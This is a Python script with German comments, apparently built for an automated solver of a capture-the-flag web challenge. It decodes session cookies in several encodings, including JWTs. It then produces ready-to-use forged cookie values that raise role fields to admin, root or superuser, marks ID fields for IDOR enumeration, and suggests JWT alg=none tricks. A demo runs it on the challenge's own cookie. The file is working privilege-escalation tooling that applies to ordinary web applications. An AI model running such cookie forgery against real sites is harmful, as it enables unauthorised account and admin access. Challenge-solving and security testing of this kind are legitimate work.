#!/usr/bin/env python3
# recon.py — Trust-Token Recon fuer den Pointeuse-Solver.
#
# Nimmt Cookies und zerlegt sie in "Kandidaten-Hebel": welcher Wert traegt
# Identitaet oder Rolle, wie ist er kodiert, und welche Mutation koennte
# eskalieren. Deterministisch, stdlib only — das Fundament, auf dem spaeter
# ein LLM (Level 1) die Kandidaten *interpretiert*.
#
# Standalone:   python3 recon.py
# Import:       from recon import classify, recon_cookies

import base64, json, binascii
from urllib.parse import unquote

# Keys die nach einer ROLLE riechen -> Eskalationswerte durchprobieren
ROLE_KEYS = {"role", "roles", "admin", "is_admin", "isadmin", "type", "level",
             "group", "groups", "perm", "perms", "permission", "permissions",
             "scope", "scopes", "acl", "priv", "manager"}
# Keys die nach IDENTITAET riechen -> IDOR-Kandidat (IDs durchzaehlen)
ID_KEYS = {"id", "uid", "user", "username", "employe", "employee", "account"}
# Typische Eskalationswerte fuer Rollen-Keys
ESCALATE = ["manager", "admin", "administrator", "root", "superuser", "true", "1"]


def _try_b64(s):
    """Toleranter base64 / base64url Decode -> str oder None."""
    t = s.replace("-", "+").replace("_", "/")
    t += "=" * (-len(t) % 4)
    try:
        raw = base64.b64decode(t, validate=False)
    except (binascii.Error, ValueError):
        return None
    try:
        return raw.decode("utf-8")
    except UnicodeDecodeError:
        return None


def _as_json(s):
    try:
        v = json.loads(s)
        return v if isinstance(v, dict) else None
    except (json.JSONDecodeError, TypeError):
        return None


def classify(name, value):
    """Ein Cookie -> strukturierter Befund (encoding, decoded, json, hebel)."""
    raw = unquote(value)  # %3D%3D -> ==
    f = {"cookie": name, "encoding": "plain", "json": None, "levers": []}

    # 1) JWT? drei base64url-Segmente mit Punkten
    parts = raw.split(".")
    if len(parts) == 3 and all(parts):
        hdr, pl = _try_b64(parts[0]), _try_b64(parts[1])
        if hdr and pl:
            f["encoding"] = "jwt"
            f["json"] = _as_json(pl)
            _find_levers(f, f["json"], jwt=True)
            return f

    # 2) Base64(JSON)?
    dec = _try_b64(raw)
    if dec is not None:
        j = _as_json(dec)
        if j is not None:
            f["encoding"] = "base64+json"
            f["json"] = j
            _find_levers(f, j)
            return f
        f["encoding"] = "base64"  # dekodiert, aber kein JSON
        return f

    # 3) Plain JSON?
    j = _as_json(raw)
    if j is not None:
        f["encoding"] = "json"
        f["json"] = j
        _find_levers(f, j)
    return f


def _find_levers(f, obj, jwt=False):
    """Markiere verdaechtige Keys und erzeuge fertige Mutationen."""
    if not isinstance(obj, dict):
        return
    for k, v in obj.items():
        kl = k.lower()
        if kl in ROLE_KEYS:
            muts = []
            for cand in ESCALATE:
                if str(v).lower() != cand:
                    muts.append(_mutate(f, k, cand, jwt))
            f["levers"].append({"typ": "rolle", "key": k, "aktuell": v,
                                "mutationen": muts})
        elif kl in ID_KEYS:
            f["levers"].append({"typ": "identitaet", "key": k, "aktuell": v,
                                "hinweis": "IDOR-Kandidat: ID durchzaehlen"})


def _mutate(f, key, newval, jwt):
    """key->newval, gleiche Kodierung. Fertiger Cookie-Wert oder Hinweis."""
    j = dict(f["json"]); j[key] = newval
    payload = json.dumps(j, separators=(",", ":"))
    if jwt:
        return {"set": f"{key}={newval}", "payload": payload,
                "cookie_value": None,
                "hinweis": "JWT: Signatur noetig (alg pruefen, evtl. alg=none)"}
    if f["encoding"].startswith("base64"):
        enc = base64.b64encode(payload.encode()).decode()
    else:
        enc = payload
    return {"set": f"{key}={newval}", "payload": payload, "cookie_value": enc}


def recon_cookies(cookies: dict):
    """Mehrere Cookies -> Liste von Befunden mit Hebeln."""
    return [classify(n, v) for n, v in cookies.items()]


def report(findings):
    """Lesbare Konsolen-Ausgabe der Kandidaten-Hebel."""
    for f in findings:
        print(f"\n■ Cookie '{f['cookie']}'  [{f['encoding']}]")
        if f["json"] is not None:
            print(f"  Inhalt: {json.dumps(f['json'], ensure_ascii=False)}")
        if not f["levers"]:
            print("  (kein verdaechtiger Hebel)")
        for lv in f["levers"]:
            if lv["typ"] == "identitaet":
                print(f"  → [IDENTITAET] {lv['key']}={lv['aktuell']!r}  "
                      f"— {lv['hinweis']}")
            else:
                print(f"  → [ROLLE] {lv['key']}={lv['aktuell']!r}  "
                      f"— {len(lv['mutationen'])} Eskalationen vorbereitet:")
                for m in lv["mutationen"][:3]:
                    cv = m["cookie_value"] or m.get("hinweis", "")
                    print(f"      {m['set']:<22} {cv[:48]}")


if __name__ == "__main__":
    # Demo auf dem echten profil-Cookie der Challenge
    demo = {"profil": "eyJlbXBsb3llIjoiVm91cyAoIzg0NzIpIiwicm9sZSI6ImVtcGxveWUifQ%3D%3D"}
    report(recon_cookies(demo))
